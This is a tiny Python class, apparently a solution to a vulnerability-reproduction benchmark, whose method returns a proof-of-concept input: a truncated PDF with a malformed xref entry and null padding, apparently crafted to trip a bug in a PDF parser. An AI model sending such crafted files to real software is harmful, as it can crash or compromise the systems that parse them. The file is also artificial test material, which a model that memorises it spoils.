class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'%PDF-1.0\nxref\n0 1\n0000000000 00000 f' + b'\x00' * 13
        return poc